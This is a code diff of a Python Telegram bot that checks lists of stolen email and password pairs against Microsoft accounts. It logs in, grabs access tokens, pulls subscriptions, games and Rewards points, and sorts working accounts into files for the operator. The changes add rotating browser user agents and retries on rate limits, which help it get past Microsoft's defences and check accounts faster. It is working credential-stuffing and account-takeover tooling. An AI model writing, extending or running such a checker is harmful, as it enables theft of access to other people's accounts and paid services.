@@ -9,6 +9,7 @@ import zipfile
 import shutil
 import uuid
 import datetime
+import random
 from urllib.parse import urlparse, parse_qs, quote
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -31,7 +32,12 @@ SFTAG_CLIENT_ID = "00000000402B5328"
 SFTAG_URL = f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 ATK_CLIENT_ID = "000000000004773A"
 
-UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+]
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("nyx")
@@ -46,101 +52,96 @@ def parse_lr(text: str, left: str, right: str) -> str:
         return ""
 
 # ============================================================
-# AUTH & API CHAIN
+# AUTH & API CHAIN (With Retry)
 # ============================================================
 async def sftag_login(session, email, password):
-    headers = {"User-Agent": UA_EDGE}
-    try:
-        async with session.get(SFTAG_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-            body = await r.text()
-            post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
-            ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
-            
-            if not post_url or not ppft:
-                return None
+    for attempt in range(3):
+        headers = {"User-Agent": random.choice(UAS)}
+        try:
+            async with session.get(SFTAG_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+                if r.status == 429:
+                    await asyncio.sleep(2)
+                    continue
+                body = await r.text()
+                post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
+                ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
+                
+                if not post_url or not ppft:
+                    await asyncio.sleep(1)
+                    continue
 
-            payload = {
-                'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 
-                'passwd': password, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 
-                'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'
-            }
+                payload = {
+                    'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 
+                    'passwd': password, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 
+                    'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'
+                }
+                
+                async with session.post(post_url, data=payload, headers=headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
+                    loc = r2.headers.get("Location", "")
+                    if "access_token=" not in loc:
+                        text = await r2.text()
+                        if "account or password is incorrect" in text.lower() or r2.status == 401:
+                            return "bad"
+                        if "identity/confirm" in loc or "recover" in loc:
+                            return "2fa"
+                        if "too many times" in text.lower() or r2.status == 429:
+                            await asyncio.sleep(2)
+                            continue
+                        continue
+                        
+                    ms_token = parse_lr(loc, "access_token=", "&")
+                    cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
+                    cid = cid.value.upper() if cid else ""
+                    return {"ms_token": ms_token, "cid": cid}
+        except Exception:
+            await asyncio.sleep(1)
             
-            async with session.post(post_url, data=payload, headers=headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
-                loc = r2.headers.get("Location", "")
-                if "access_token=" not in loc:
-                    text = await r2.text()
-                    if "account or password is incorrect" in text.lower() or r2.status == 401:
-                        return "bad"
-                    if "identity/confirm" in loc or "recover" in loc:
-                        return "2fa"
-                    return None
-                    
-                ms_token = parse_lr(loc, "access_token=", "&")
-                cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
-                cid = cid.value.upper() if cid else ""
-                return {"ms_token": ms_token, "cid": cid}
-    except Exception:
-        return None
+    return "error"
 
 async def get_pifd_atk(session):
     url = f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
     try:
-        async with session.get(url, headers={"User-Agent": UA_EDGE}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        async with session.get(url, headers={"User-Agent": random.choice(UAS)}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             loc = r.headers.get("Location", "")
             return parse_lr(loc, "access_token=", "&token_type")
     except: return ""
 
 async def get_payment_data(session, atk):
-    headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
+    headers = {"User-Agent": random.choice(UAS), "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
     result = {"subs": [], "points": "0"}
     now = datetime.datetime.utcnow()
 
-    # 1. Transactions & Subs
+    # 1. Transactions (Subs & Games)
     try:
         url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                data = await r.json()
+                text = await r.text()
                 
-                # Parse Subscriptions
-                for sub in data.get("subscriptions", []):
-                    title = sub.get("title", "Unknown Sub")
-                    next_date_str = sub.get("nextRenewalDate", "")
+                # Parse Active Subscriptions
+                for m in re.finditer(r'"subscriptionId":"([^"]+)".*?"title":"([^"]+)".*?"nextRenewalDate":"([^"]+)"', text, re.DOTALL):
+                    title = m.group(2)
+                    next_date = m.group(3).split("T")[0]
                     
-                    is_active = False
-                    next_date = "N/A"
-                    
-                    if next_date_str:
-                        try:
-                            dt = datetime.datetime.strptime(next_date_str.split("T")[0], "%Y-%m-%d")
-                            next_date = next_date_str.split("T")[0]
-                            if dt > now:
-                                is_active = True
-                        except:
-                            is_active = True
-                    else:
-                        # No renewal date usually means lifetime or active without renewal
-                        is_active = True
+                    try:
+                        dt = datetime.datetime.strptime(next_date, "%Y-%m-%d")
+                        if dt > now:
+                            result["subs"].append(f"{title} | Next Billing: {next_date}")
+                    except:
+                        result["subs"].append(f"{title} | Next Billing: {next_date}")
                         
-                    if is_active:
-                        sub_str = f"{title}"
-                        if next_date != "N/A":
-                            sub_str += f" | Next Billing: {next_date}"
-                        result["subs"].append(sub_str)
-                
-                # Parse One-time Orders (Games)
-                for order in data.get("orders", []):
-                    title = order.get("title", "Unknown Game")
-                    # Prevent duplicates if it's already listed as a sub
-                    if title and not any(title in s for s in result["subs"]):
+                # Parse Games / One-time Orders
+                for m in re.finditer(r'"orderId":"([^"]+)".*?"title":"([^"]+)"', text, re.DOTALL):
+                    title = m.group(2)
+                    if not any(title in s for s in result["subs"]):
                         result["subs"].append(f"{title} (Game)")
-                        
+                                
     except: pass
 
     # 2. Rewards Points
     try:
         url3 = "https://rewards.bing.com/"
-        async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        async with session.get(url3, headers={"User-Agent": random.choice(UAS)}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 text = await r.text()
                 m = re.search(r'"availablePoints":(\d+)', text)
@@ -161,6 +162,9 @@ async def check_account(session, email, password):
         if login_res == "bad": return res
         if login_res == "2fa":
             res["status"] = "2fa"
+            return res
+        if login_res == "error":
+            res["status"] = "error"
             return res
         if not login_res: return res
             
@@ -192,10 +196,11 @@ async def process_combos(combos, chat_id, status_msg, bot):
                 last_edit = now
                 hits = sum(1 for x in results if x["status"] == "valid")
                 bad = sum(1 for x in results if x["status"] == "bad")
+                err = sum(1 for x in results if x["status"] == "error")
                 tfa = sum(1 for x in results if x["status"] == "2fa")
                 elapsed = now - t_start
                 try:
-                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>", parse_mode=ParseMode.HTML)
+                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b> | err: <b>{err}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>", parse_mode=ParseMode.HTML)
                 except: pass
         await asyncio.gather(*(worker(e, p) for e, p in combos))
 
@@ -203,38 +208,37 @@ async def process_combos(combos, chat_id, status_msg, bot):
     valid = [r for r in results if r["status"] == "valid"]
     bad = [r for r in results if r["status"] == "bad"]
     tfa = [r for r in results if r["status"] == "2fa"]
+    errors = [r for r in results if r["status"] == "error"]
     
     ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)
 
     def write_file(name, lines):
         with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))
 
-    rich_valid = []
+    valid_all = []
+    valid_subs = []
+    valid_nosub = []
+
     for r in valid:
-        if not r["data"]: continue
-        d = r["data"]
+        valid_all.append(f"{r['email']}:{r['pw']}")
         
+        d = r["data"] or {"subs": [], "points": "0"}
         sub_str = ", ".join(d["subs"]) if d["subs"] else "None"
         
-        # New stripped down format
-        line = f"{r['email']}:{r['pw']} | Points: {d['points']} | Subs: [{sub_str}]"
-        rich_valid.append(line)
+        if d["subs"] or d["points"] != "0":
+            line = f"{r['email']}:{r['pw']} | Points: {d['points']} | Subs: [{sub_str}]"
+            valid_subs.append(line)
+        else:
+            valid_nosub.append(f"{r['email']}:{r['pw']}")
 
-    write_file("valid_rich.txt", rich_valid)
-    write_file("valid.txt", [f"{r['email']}:{r['pw']}" for r in valid])
-    write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
-    write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
-    
-    gp = []
-    for r in valid:
-        if not r["data"]: continue
-        d = r["data"]
-        if any("pass" in s.lower() or "game pass" in s.lower() for s in d["subs"]):
-            gp.append(f"{r['email']}:{r['pw']} | {', '.join(d['subs'])}")
-            
-    if gp: write_file("gamepass.txt", gp)
+    write_file("Valid_All.txt", valid_all)
+    write_file("Valid_Subscriptions.txt", valid_subs)
+    write_file("Valid_No_Subscription.txt", valid_nosub)
+    write_file("Invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
+    write_file("2FA.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
+    write_file("Errors.txt", [f"{r['email']}:{r['pw']}" for r in errors])
 
-    write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}"])
+    write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}", f"Errors: {len(errors)}"])
 
     zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
     with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
